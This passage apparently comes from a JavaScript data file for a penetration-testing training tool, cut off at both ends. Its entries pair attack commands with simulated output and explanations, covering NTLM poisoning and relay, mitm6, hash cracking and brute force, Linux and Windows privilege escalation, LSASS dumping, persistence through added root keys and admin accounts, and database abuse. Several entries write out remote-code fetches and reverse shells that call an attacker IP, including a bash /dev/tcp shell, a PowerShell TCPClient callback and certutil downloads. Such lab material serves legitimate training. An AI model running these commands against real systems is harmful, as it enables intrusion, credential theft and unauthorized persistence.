        '[+] Saving ticket in administrator@cifs_file01.ccache',
      ].join('\n'),
      signal: '[+] Saving ticket in administrator@cifs_file01.ccache',
      teach: 'With delegation rights you ask the KDC for a service ticket "on behalf of" any user (S4U2self then S4U2proxy) and get a ccache that lets you act as Administrator against that service. Load the ticket (KRB5CCNAME) and you are in.',
    },

    // ============================ CREDENTIALS & CRACKING ============================
    'responder-poison': {
      signal: '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
      teach: 'Responder runs entirely on YOUR box; there is nothing to install on a target. It is PASSIVE: it only catches authentication that happens to come your way (a user mistyping a share name, so the host broadcasts "who is fileshare?" and Responder answers "me"). On a quiet network you could wait forever, so pair it with a coercion tool (coercer / PetitPotam / PrinterBug) to FORCE a chosen host to authenticate to you. Either way you walk away with a NetNTLMv2 hash to crack or relay.',
      steps: [
        { where: 'local', tool: 'responder', cmd: 'sudo responder -I eth0 -w', output: [
          '[+] Poisoners: LLMNR, NBT-NS, MDNS',
          '[+] Servers: SMB, HTTP, LDAP on',
          '[+] Listening for events...',
        ].join('\n') },
        { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", output: [
          '[+] DFSCoerce: 10.10.10.50 coerced to authenticate to 10.10.14.5',
          '↩ caught in your Responder window:',
          '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
          '[SMB] NTLMv2-SSP Hash     : jdoe::ACME:1122334455667788:A1B2...:0101...',
        ].join('\n') },
      ],
    },
    'ntlm-relay-attack': {
      signal: '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
      teach: 'Relaying forwards a captured authentication to a SECOND host instead of cracking it, but ntlmrelayx, like Responder, only relays auth that comes IN to it. So you drive the traffic: coerce a target to authenticate (coercer / PetitPotam), and ntlmrelayx relays that to a machine where the victim is local admin (SMB signing off), dumping its SAM. "SUCCEED" means you are in without ever knowing the password.',
      steps: [
        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'impacket-ntlmrelayx -tf relay-targets.txt -smb2support', output: '[*] Servers started, waiting for connections' },
        { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", output: [
          '[+] 10.10.10.50 coerced to authenticate to 10.10.14.5',
          '↩ relayed by ntlmrelayx:',
          '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
          '[*] Dumping local SAM hashes',
          'Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        ].join('\n') },
      ],
    },
    'mitm6-ipv6-takeover': {
      signal: '[*] Authenticating against ldaps://10.10.10.10 as ACME\\jdoe SUCCEED',
      teach: 'mitm6 runs on your box and abuses Windows\' preference for IPv6: it answers the DHCPv6 nobody configured, becomes the victim\'s DNS, and points WPAD at you, then ntlmrelayx relays the auth that follows to LDAP. It is not passive, but it does wait for a Windows host to renew (often a reboot or logon), so pair it with the relay and give it time.',
      steps: [
        { where: 'local', tool: 'mitm6', cmd: 'sudo mitm6 -i eth0 -d acme.internal', output: [
          '[*] Sending rogue DHCPv6 replies; spoofing DNS for *.acme.internal',
          '[*] IPv6 address assigned to victim 10.10.10.50',
        ].join('\n') },
        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'impacket-ntlmrelayx -6 -t ldaps://10.10.10.10 -wh fakewpad.acme.internal -l loot', output: [
          '[*] Victim queried WPAD, serving malicious proxy config',
          '[*] Authenticating against ldaps://10.10.10.10 as ACME\\jdoe SUCCEED',
          '[*] Domain info and delegation rights written to loot/',
        ].join('\n') },
      ],
    },
    'crack-identify': {
      cmd: 'nth -f hashes.txt', tool: 'name-that-hash',
      output: [
        '$krb5tgs$23$...',
        'Most Likely:',
        '  Kerberos 5 TGS-REP etype 23, HC: 13100  JtR: krb5tgs',
      ].join('\n'),
      signal: '  Kerberos 5 TGS-REP etype 23, HC: 13100  JtR: krb5tgs',
      teach: 'Before you can crack a hash you must know what it is. name-that-hash reads the format and tells you the hashcat mode (13100). Guess the mode wrong and hashcat wastes hours on the wrong algorithm, identify first, always.',
    },
    'crack-kerberoast': {
      cmd: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$...:3f2a...:Summer2024!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'A Kerberoast ticket (mode 13100) is encrypted with the service account\'s password hash, so you crack it offline at full speed with no lockout. "Cracked" means you now hold that account\'s cleartext password.',
    },
    'crack-asrep-offline': {
      cmd: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$krb5asrep$23$jdoe@ACME.INTERNAL:a1b2...:Welcome2024!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'An AS-REP hash (mode 18200) comes from an account with pre-auth disabled, and it cracks offline at full speed. "Cracked" turns the roast into a login, a real domain credential.',
    },
    'crack-ntlm': {
      cmd: 'hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '31d6cfe0d16ae931b73c59d7e0c089c0:(empty)',
        '7c6a180b36896a0a8c02787eeafb0e4c:password1',
        'Status...........: Cracked',
      ].join('\n'),
      signal: '7c6a180b36896a0a8c02787eeafb0e4c:password1',
      teach: 'A dumped NTLM hash (mode 1000) cracks offline. You do not always need to (NTLM can be passed directly), but a recovered cleartext password is reusable on services that will not take a hash (RDP, web, SSH).',
    },
    'crack-netntlmv2': {
      cmd: 'hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        'JDOE::ACME:1122334455667788:A1B2...:Winter2024!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'JDOE::ACME:1122334455667788:A1B2...:Winter2024!',
      teach: 'The NetNTLMv2 hash Responder captured cracks offline in hashcat mode 5600. A NetNTLMv2 hash CANNOT be passed (only cracked or relayed), so recover the password and it becomes a real login wherever that account is valid.',
    },
    'crack-shadow': {
      cmd: 'hashcat -m 1800 shadow.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        'root:$6$xyz$...:toor123',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'root:$6$xyz$...:toor123',
      teach: 'A $6$ hash from /etc/shadow is sha512crypt (mode 1800), slow by design, so lean on a good wordlist and rules. Crack root\'s hash and the privesc is done; crack a service user and you may unlock lateral moves.',
    },
    'crack-archive': {
      cmd: 'zip2john backup.zip > archive.hash && hashcat -m 17200 archive.hash rockyou.txt', tool: 'zip2john',
      output: [
        'backup.zip/config.bak:$pkzip2$...:hunter2',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'backup.zip/config.bak:$pkzip2$...:hunter2',
      teach: 'A password-protected archive you looted is just another crackable hash, zip2john/office2john extract it, hashcat breaks it. The contents are often the reason it was protected: credentials, keys, or the next foothold.',
    },
    'online-brute-ssh': {
      cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://10.10.10.10', tool: 'hydra',
      output: [
        '[DATA] attacking ssh://10.10.10.10:22/',
        '[22][ssh] host: 10.10.10.10   login: bmurphy   password: iloveyou',
        '1 of 1 target successfully completed, 1 valid password found',
      ].join('\n'),
      signal: '[22][ssh] host: 10.10.10.10   login: bmurphy   password: iloveyou',
      teach: 'When you have a real username but no password, a measured online brute against SSH can find a weak one. Keep the wordlist small and the rate sane (-t 4), lab accounts lock out too, and a found pair is an instant shell.',
    },
    'online-brute-ftp': {
      cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f ftp://10.10.10.10', tool: 'hydra',
      output: [
        '[DATA] attacking ftp://10.10.10.10:21/',
        '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
      ].join('\n'),
      signal: '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
      teach: 'Against a confirmed FTP service with a known user, a measured hydra run finds weak passwords, and always test anonymous first, it is free. A hit gives you file access, and often the files hold the next credential.',
    },
    'online-brute-rdp': {
      cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 1 rdp://10.10.10.10', tool: 'hydra',
      output: [
        '[DATA] attacking rdp://10.10.10.10:3389/',
        '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
      ].join('\n'),
      signal: '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
      teach: 'A weak RDP password is an interactive desktop. Brute it only with a real username and a short list at -t 1, RDP lockout policies are unforgiving. A hit here is a full GUI session as that user.',
    },
    'crack-mscache2': {
      cmd: 'hashcat -m 2100 dcc2.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$DCC2$10240#jdoe#a1b2c3...:Autumn2023!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: '$DCC2$10240#jdoe#a1b2c3...:Autumn2023!',
      teach: 'Domain Cached Credentials (mscash2, mode 2100) are what a laptop stores so a domain user can log in offline. They crack slowly and cannot be passed (only cracked), but a recovered password is a real domain credential.',
    },

    // ============================ LINUX PRIVESC ============================
    'linux-enum': {
      signal: '    (ALL) NOPASSWD: /usr/bin/find',
      teach: 'linpeas runs every local privesc check at once and colour-codes the leads, but it is not on the target, so you serve it from your box and pipe it straight into a shell (no file touches disk). A NOPASSWD sudo entry on a GTFOBins binary like find is a bright-green, near-certain path to root. Enumerate first; it points you at the real vector.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding linpeas.sh', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'linpeas', cmd: 'curl -sL http://10.10.14.5:8000/linpeas.sh | sh', output: [
          '[+] Sudo version 1.8.31',
          '[+] Checking sudo -l',
          '    (ALL) NOPASSWD: /usr/bin/find',
          '[+] SUID - Check easy privesc',
          '    /usr/bin/pkexec',
        ].join('\n') },
      ],
    },
    'sudo-abuse': {
      cmd: 'sudo -l', tool: 'sh',
      output: [
        'Matching Defaults entries for www-data on target:',
        '    env_reset, mail_badpass',
        'User www-data may run the following commands on target:',
        '    (ALL) NOPASSWD: /usr/bin/find',
      ].join('\n'),
      signal: '    (ALL) NOPASSWD: /usr/bin/find',
      teach: 'sudo -l lists what you may run as another user without a password. NOPASSWD on a GTFOBins binary like find is a direct road to root (find . -exec /bin/sh \\; ). It is the first command to run on any Linux foothold.',
    },
    'writable-passwd': {
      cmd: 'ls -la /etc/passwd', tool: 'sh',
      output: [
        '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
      ].join('\n'),
      signal: '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
      teach: 'A world-writable /etc/passwd lets you add a root-UID user with a password hash you control (openssl passwd), then su to it. A single misconfigured permission bit is a direct path to root.',
    },
    'nfs-squash': {
      cmd: 'showmount -e 10.10.10.10', tool: 'showmount',
      output: [
        'Export list for 10.10.10.10:',
        '/srv/share  *(rw,no_root_squash)',
      ].join('\n'),
      signal: '/srv/share  *(rw,no_root_squash)',
      teach: 'no_root_squash on an NFS export means files you create as root on your own machine stay root-owned on the target. Mount it, drop a root-owned SUID shell, and run it on the box, a classic NFS privesc. Check the export options first.',
    },
    'lxc-lxd-escape': {
      cmd: 'id', tool: 'sh',
      output: [
        'uid=1000(dev) gid=1000(dev) groups=1000(dev),110(lxd)',
      ].join('\n'),
      signal: 'uid=1000(dev) gid=1000(dev) groups=1000(dev),110(lxd)',
      teach: 'Membership in the lxd group is root-equivalent: you launch a privileged container that mounts the host filesystem and read or write anything as root. Like the docker group, lxd is a privilege nobody thinks of as one, always check your groups.',
    },
    'docker-socket': {
      cmd: 'ls -la /var/run/docker.sock && id', tool: 'sh',
      output: [
        'srw-rw---- 1 root docker 0 Jan 1 10:00 /var/run/docker.sock',
        'uid=1000(dev) gid=1000(dev) groups=1000(dev),998(docker)',
      ].join('\n'),
      signal: 'uid=1000(dev) gid=1000(dev) groups=1000(dev),998(docker)',
      teach: 'Membership in the docker group is root-equivalent: you can start a container that mounts the host\'s / and read or write anything as root. The docker socket being reachable is the whole game.',
    },
    'suid-gtfobins': {
      cmd: 'find / -perm -4000 -type f 2>/dev/null', tool: 'sh',
      output: [
        '/usr/bin/passwd',
        '/usr/bin/sudo',
        '/usr/bin/find',
      ].join('\n'),
      signal: '/usr/bin/find',
      teach: 'A SUID binary runs as its owner (often root) no matter who starts it. Cross the list against GTFOBins, /usr/bin/find with the SUID bit is a one-liner to a root shell. Ignore the expected ones (passwd, sudo); hunt the unusual.',
    },
    'pspy-monitor': {
      signal: '2026/09/17 10:41:01 CMD: UID=0  PID=4120  /bin/bash /opt/backup.sh',
      teach: 'pspy watches the process table without root, so it catches cron jobs and scheduled tasks you cannot see in crontab, but it is a binary you have to get onto the box first. Serve it from your box, pull it down and make it executable, then run it. A root job (UID=0) running every 2 minutes is a privesc lead: if you can write the script it runs, you run code as root.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding pspy64', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'pspy', cmd: 'wget http://10.10.14.5:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -pf -i 1000', output: [
          "Saved '/tmp/pspy' [3078592/3078592]",
          '2026/09/17 10:41:01 CMD: UID=0  PID=4120  /bin/bash /opt/backup.sh',
          '2026/09/17 10:43:01 CMD: UID=0  PID=4221  /bin/bash /opt/backup.sh',
        ].join('\n') },
      ],
    },
    'cron-abuse': {
      cmd: 'cat /etc/crontab', tool: 'sh',
      output: [
        'SHELL=/bin/sh',
        '*/2 *   * * *   root    /opt/backup.sh',
        '# and /opt/backup.sh is world-writable',
      ].join('\n'),
      signal: '*/2 *   * * *   root    /opt/backup.sh',
      teach: 'A cron job that runs as root on a script you can write is a direct privesc: append a reverse shell or a SUID copy of bash, wait for the next run, and you are root. Check /etc/crontab, /etc/cron.*, and tar-wildcard jobs.',
    },
    'capabilities': {
      cmd: 'getcap -r / 2>/dev/null', tool: 'sh',
      output: [
        '/usr/bin/python3.8 = cap_setuid+ep',
        '/usr/bin/ping = cap_net_raw+ep',
      ].join('\n'),
      signal: '/usr/bin/python3.8 = cap_setuid+ep',
      teach: 'File capabilities grant slices of root power without the SUID bit. cap_setuid+ep on python means it can set its UID to 0, one line (os.setuid(0)) and you are root. Always run getcap -r / on a Linux box.',
    },
    'linux-loot-hunt': {
      cmd: 'grep -rils "password" /var/www /home 2>/dev/null', tool: 'sh',
      output: [
        '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
        '/home/dev/.bash_history: mysql -u root -pSuperSecret123',
      ].join('\n'),
      signal: '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
      teach: 'Once you have a shell, loot before you escalate. Config files, shell history, and web roots leak passwords constantly, and people reuse them, so a web app\'s DB password is often root\'s too. Grep widely for password, secret, and key.',
    },
    'linux-persistence': {
      signal: 'root@target:~#',
      teach: 'Labs revert and shells die. Adding your public key to authorized_keys gives you a stable, password-free way back in, far better than re-exploiting each time. On a real engagement, persistence is scoped and documented.',
      steps: [
        { where: 'host', tool: 'sh', cmd: "mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA...you@kali' >> /root/.ssh/authorized_keys", output: [
          '# your public key is now appended to root\'s authorized_keys (no output on success)',
        ].join('\n') },
        { where: 'local', tool: 'ssh', cmd: 'ssh -i id_ed25519 root@10.10.10.10', output: [
          'Last login: Mon Jan  1 10:00:00 2024 from 10.10.14.5',
          'root@target:~#',
        ].join('\n') },
      ],
    },

    // ============================ WINDOWS PRIVESC ============================
    'windows-enum': {
      signal: 'SeImpersonatePrivilege: Enabled',
      teach: 'Start with the built-in whoami /priv (instant, nothing to stage), then run the deep sweep with winPEAS, which is an .exe you must get onto the box first. Serve it from your box and pull it over with certutil, then run it. SeImpersonate Enabled on a service account means a "potato" exploit gets you SYSTEM.',
      steps: [
        { where: 'host', tool: 'cmd', cmd: 'whoami /priv', output: [
          'Privilege Name                State',
          'SeImpersonatePrivilege        Enabled',
          'SeChangeNotifyPrivilege       Enabled',
        ].join('\n') },
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding winPEASx64.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'winpeas', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/winPEASx64.exe wp.exe & wp.exe', output: [
          'CertUtil: -URLCache command completed successfully.',
          'ÉÍÍÍÍ¹ Checking token privileges',
          '    SeImpersonatePrivilege: Enabled',
          'ÉÍÍÍÍ¹ Unquoted Service Paths',
          '    VulnSvc: C:\\Program Files\\Acme Agent\\service.exe',
        ].join('\n') },
      ],
    },
    'seimpersonate': {
      signal: 'nt authority\\system',
      teach: 'SeImpersonate lets a process impersonate a client that connects to it. The "potato" family (GodPotato, PrintSpoofer) tricks a SYSTEM service into connecting, then steals its token. The potato is an .exe, so the chain is: confirm the privilege, serve the binary from your box, pull it over with certutil and run it, and you are SYSTEM.',
      steps: [
        { where: 'host', tool: 'cmd', cmd: 'whoami /priv | findstr /i impersonate', output: 'SeImpersonatePrivilege        Impersonate a client after authentication  Enabled' },
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding GodPotato-NET4.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'godpotato', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/GodPotato-NET4.exe gp.exe & gp.exe -cmd "cmd /c whoami"', output: [
          '[*] CombaseModule: 0x7ff...',
          '[*] DispatchTable: 0x7ff...',
          '[*] Trigger RPCSS',
          'nt authority\\system',
        ].join('\n') },
      ],
    },
    'unquoted-service-path': {
      cmd: 'wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "c:\\windows\\\\"', tool: 'sh',
      output: [
        'VulnSvc    C:\\Program Files\\Acme Agent\\service.exe    Auto',
      ].join('\n'),
      signal: 'VulnSvc    C:\\Program Files\\Acme Agent\\service.exe    Auto',
      teach: 'An unquoted service path with spaces lets Windows try C:\\Program.exe, then C:\\Program Files\\Acme.exe, before the real binary. If you can write to one of those directories, drop your payload there and the service runs it, often as SYSTEM.',
    },
    'weak-service-permissions': {
      signal: '        SERVICE_ALL_ACCESS',
      teach: 'accesschk (a Sysinternals .exe) finds services whose ACLs you can write, but you have to stage it first: serve it from your box, pull it over with certutil, then run it. SERVICE_ALL_ACCESS over a service means you can rewrite its binary path (sc config VulnSvc binpath= ...) to run any command and restart it, code execution as the service account, usually SYSTEM.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding accesschk.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'accesschk', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/accesschk.exe ac.exe & ac.exe -uwcqv someuser VulnSvc /accepteula', output: [
          'CertUtil: -URLCache command completed successfully.',
          'VulnSvc',
          '  RW someuser',
          '        SERVICE_ALL_ACCESS',
        ].join('\n') },
      ],
    },
    'alwaysinstallelevated': {
      cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', tool: 'sh',
      output: [
        'HKLM\\...\\Installer',
        '    AlwaysInstallElevated    REG_DWORD    0x1',
        '# HKCU is also 0x1',
      ].join('\n'),
      signal: '    AlwaysInstallElevated    REG_DWORD    0x1',
      teach: 'When AlwaysInstallElevated is 0x1 in BOTH HKLM and HKCU, any MSI you install runs as SYSTEM. Build a malicious MSI (msfvenom -f msi), run msiexec, and you escalate, a pure misconfiguration, no exploit needed.',
    },
    'dpapi-secrets': {
      cmd: "impacket-dpapi credential -file C:\\Users\\dev\\AppData\\...\\Credentials\\A1B2 -key 0x...", tool: 'impacket-dpapi',
      output: [
        '[CREDENTIAL]',
        'Target: LegacyGeneric:target=git',
        'Username: svc_build',
        'Unknown3: Bu1ld!2023',
      ].join('\n'),
      signal: 'Unknown3: Bu1ld!2023',
      teach: 'Windows DPAPI encrypts saved browser and app passwords with a key derived from the user\'s login. With that user\'s context (or their masterkey) you decrypt the blobs and recover cleartext credentials, often for other systems the user accessed.',
    },
    'stored-credentials': {
      cmd: 'cmdkey /list', tool: 'sh',
      output: [
        'Currently stored credentials:',
        '    Target: Domain:interactive=ACME\\administrator',
        '    Type: Domain Password',
      ].join('\n'),
      signal: '    Target: Domain:interactive=ACME\\administrator',
      teach: 'Windows caches credentials for convenience. cmdkey /list shows stored logins you can reuse with runas /savecred, sometimes an Administrator credential is sitting there for the taking, no cracking needed.',
    },
    'windows-old-hives': {
      cmd: 'dir C:\\Windows.old\\Windows\\System32\\config', tool: 'sh',
      output: [
        'Directory of C:\\Windows.old\\Windows\\System32\\config',
        '01/08/2024  09:12            65,536 SAM',
        '01/08/2024  09:12         9,437,184 SYSTEM',
      ].join('\n'),
      signal: '01/08/2024  09:12            65,536 SAM',
      teach: 'A Windows.old folder from an in-place upgrade keeps old registry hives (SAM and SYSTEM) that a low-priv user can often read. Pull them and dump offline (secretsdump) for the local Administrator hash, then pass it.',
    },
    'wesng-patch-gaps': {
      cmd: 'systeminfo', tool: 'sh',
      output: [
        'OS Name:          Microsoft Windows Server 2016 Standard',
        'OS Version:       10.0.14393 N/A Build 14393',
        'Hotfix(s):        3 Hotfix(s) Installed.',
      ].join('\n'),
      signal: 'OS Version:       10.0.14393 N/A Build 14393',
      teach: 'systeminfo gives the exact build and installed hotfixes. Feed it to wesng (Windows Exploit Suggester) and it lists the kernel exploits the box is missing. Confirm the build and architecture before running one, a wrong kernel exploit bluescreens the target.',
    },
    'windows-persistence': {
      cmd: "net user obol_svc 'Str0ng!Passw0rd' /add && net localgroup administrators obol_svc /add", tool: 'sh',
      output: [
        'The command completed successfully.',
        'The command completed successfully.',
      ].join('\n'),
      signal: 'The command completed successfully.',
      teach: 'A local admin account you add is a durable way back onto a Windows box after a revert or reboot. On a real engagement this is scoped, logged, and cleaned up afterward; note what you create so you can remove it.',
    },
    'lsass-dump-onbox': {
      cmd: 'rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full', tool: 'cmd',
      output: [
        '# dump written; parse offline with pypykatz:',
        'Username: administrator   NT: 2b576acbe6b...',
      ].join('\n'),
      signal: 'Username: administrator   NT: 2b576acbe6b...',
      teach: 'LSASS holds the credentials of everyone logged in. With local admin you dump its memory and parse it offline (pypykatz) for NTLM hashes, including, on a shared box, domain admins. Those hashes feed pass-the-hash and lateral movement.',
    },
    'defense-enum': {
      cmd: 'powershell -c "$ExecutionContext.SessionState.LanguageMode"', tool: 'powershell',
      output: [
        'ConstrainedLanguage',
      ].join('\n'),
      signal: 'ConstrainedLanguage',
      teach: 'Before you throw tooling at a Windows box, learn what is watching: Constrained Language Mode, AppLocker, and real-time protection all change what will run. Knowing the constraints up front saves you from burning a shell on something that was never going to execute.',
    },

    // ============================ DATABASES ============================
    'mysql-login': {
      cmd: "mysql -h 10.10.10.10 -u root -p'toor' -e 'SELECT version();'", tool: 'mysql',
      output: [
        '+-------------------------+',
        '| version()               |',
        '+-------------------------+',
        '| 5.7.33-0ubuntu0.16.04.1 |',
        '+-------------------------+',
      ].join('\n'),
      signal: '| 5.7.33-0ubuntu0.16.04.1 |',
      teach: 'A successful MySQL login is a foothold of its own: from SQL you can read application secrets, write files to the web root with INTO OUTFILE, and sometimes reach the OS. Confirm the version first, it steers what is possible.',
    },
    'mysql-loot': {
      cmd: "mysql -h 10.10.10.10 -u root -p'toor' -e 'SELECT user,host,authentication_string FROM mysql.user;'", tool: 'mysql',
      output: [
        '+------------------+------+-------------------------------------------+',
        '| user             | host | authentication_string                     |',
        '+------------------+------+-------------------------------------------+',
        '| root             | %    | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |',
        '| webapp           | %    | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |',
        '+------------------+------+-------------------------------------------+',
      ].join('\n'),
      signal: '| root             | %    | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |',
      teach: 'Once you have a DB session, the mysql.user table holds every account\'s password hash (mode 300 for the *HEX form). Dump them and crack offline, database passwords are reused as system and domain passwords all the time.',
    },
    'mssql-login': {
      cmd: 'mssqlclient.py acme.internal/svc_sql:P@ssw0rd2023@10.10.10.10 -windows-auth', tool: 'mssqlclient.py',
      output: [
        '[*] Encryption required, switching to TLS',
        '[*] ACME\\svc_sql  guest@master',
        "SQL> SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;",
        'is_sysadmin : 1',
      ].join('\n'),
      signal: 'is_sysadmin : 1',
      teach: 'The first thing to check on an MSSQL login is IS_SRVROLEMEMBER(\'sysadmin\'). A 1 means you can re-enable xp_cmdshell and run OS commands, or impersonate other logins. Sysadmin on MSSQL is effectively a shell on the host.',
    },
    'mssql-xp-cmdshell': {
      cmd: "mssqlclient.py ...@10.10.10.10 -q \"EXEC xp_cmdshell 'whoami'\"", tool: 'mssqlclient.py',
      output: [
        'output',
        '--------------------------------',
        'nt service\\mssqlserver',
      ].join('\n'),
      signal: 'nt service\\mssqlserver',
      teach: 'With sysadmin on MSSQL you re-enable xp_cmdshell and run OS commands as the SQL service account. The whoami output confirms code execution, the database just became a shell. From here, grab a reverse shell.',
    },
    'postgres-login': {
      cmd: "PGPASSWORD=postgres psql -h 10.10.10.10 -U postgres -c 'SELECT version();'", tool: 'psql',
      output: [
        '                         version',
        '--------------------------------------------------------------',
        ' PostgreSQL 13.3 on x86_64-pc-linux-gnu, compiled by gcc 10.2',
        '(1 row)',
      ].join('\n'),
      signal: ' PostgreSQL 13.3 on x86_64-pc-linux-gnu, compiled by gcc 10.2',
      teach: 'A PostgreSQL session with the right role can read files and, via COPY ... FROM PROGRAM, run commands. As with any DB foothold, the version tells you which of those paths is open to you.',
    },
    'redis-enum': {
      cmd: 'redis-cli -h 10.10.10.10 INFO server', tool: 'redis-cli',
      output: [
        '# Server',
        'redis_version:6.0.16',
        'os:Linux 5.15.0-79-generic x86_64',
        'config_file:/etc/redis/redis.conf',
      ].join('\n'),
      signal: 'redis_version:6.0.16',
      teach: 'An unauthenticated Redis answers INFO to anyone. Beyond the version, a writable Redis can be abused to drop an SSH key or a web shell (CONFIG SET dir / dbfilename), an open Redis on 6379 is frequently a direct foothold.',
    },
    'mongo-enum': {
      cmd: 'nmap -Pn -p 27017 --script mongodb-info,mongodb-databases 10.10.10.10', tool: 'nmap',
      output: [
        'PORT      STATE SERVICE',
        '27017/tcp open  mongodb',
        '| mongodb-databases:',
        '|   admin   users   app_secrets',
        '|_  (no authentication required)',
      ].join('\n'),
      signal: '|_  (no authentication required)',
      teach: 'MongoDB historically shipped with no authentication. If you can list databases without credentials, you can read them, app_secrets and users collections often hold password hashes or API keys outright.',
    },

    // ============================ SHELLS & TRANSFER ============================
    'ssh-key-login': {
      cmd: 'chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no bob@10.10.10.10', tool: 'ssh',
      output: [
        'Last login: Mon Jan  1 10:00:00 2024 from 10.10.14.5',
        'bob@target:~$ id',
        'uid=1000(bob) gid=1000(bob) groups=1000(bob)',
      ].join('\n'),
      signal: 'bob@target:~$ id',
      teach: 'A private key you looted is a password-free login, but SSH refuses a key others can read, hence chmod 600. A stable SSH session beats any reverse shell: it has a real TTY and survives. Try looted keys against every user and host.',
    },
    'shell-listener': {
      cmd: 'rlwrap nc -lvnp 4444', tool: 'rlwrap',
      output: [
        'Listening on 0.0.0.0 4444',
      ].join('\n'),
      signal: 'Listening on 0.0.0.0 4444',
      teach: 'Before you fire a reverse shell, start the catcher. nc -lvnp 4444 listens; wrapping it in rlwrap gives you command history and arrow keys once the shell lands. Set the listener first, a callback with nothing listening is lost.',
    },
    'shell-revshell-linux': {
      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
      teach: 'Start the listener FIRST, then deliver the payload on the target (through a web bug, a cron, an upload). It dials back and your listener catches it, code execution becoming an interactive shell. The prompt is raw; upgrade it to a PTY next.',
      steps: [
        { where: 'local', tool: 'nc', cmd: 'rlwrap nc -lvnp 4444', output: 'Listening on 0.0.0.0 4444' },
        { where: 'host', tool: 'bash', cmd: "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'", output: [
          '↩ caught back on your listener:',
          'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
          'www-data@target:/var/www/html$ id',
          'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
        ].join('\n') },
      ],
    },
    'shell-revshell-windows': {
      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
      teach: 'Same two beats as a Linux reverse shell: listener on your box first, then run the PowerShell payload on the target. It calls back and you land as the service account the web app runs under; next comes Windows enumeration.',
      steps: [
        { where: 'local', tool: 'nc', cmd: 'rlwrap nc -lvnp 4444', output: 'Listening on 0.0.0.0 4444' },
        { where: 'host', tool: 'powershell', cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);...\"", output: [
          '↩ caught back on your listener:',
          'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
          'PS C:\\> whoami',
          'acme\\svc_web',
        ].join('\n') },
      ],
    },
    'shell-pty-upgrade': {
      signal: 'www-data@target:/$ export TERM=xterm',
